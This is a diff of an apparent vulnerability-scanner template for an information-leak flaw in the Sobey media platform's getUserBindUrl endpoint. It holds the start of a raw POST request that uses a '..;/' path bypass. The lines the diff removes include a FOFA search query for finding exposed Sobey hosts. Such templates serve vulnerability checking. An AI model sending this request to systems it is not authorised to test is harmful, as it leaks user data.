@@ -3,12 +3,8 @@ info:
   name: 索贝融媒体 getUserBindUrl 存在信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tv8nb17oeg7a744t'
+  description: ''
   tags: info-leak,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tv8nb17oeg7a744t
-    fofa: icon_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"
 http:
 - raw:
   - 'POST /sobey-mchEditor/js/..;/mch/thirdPlatToto/getUserBindUrl HTTP/1.1
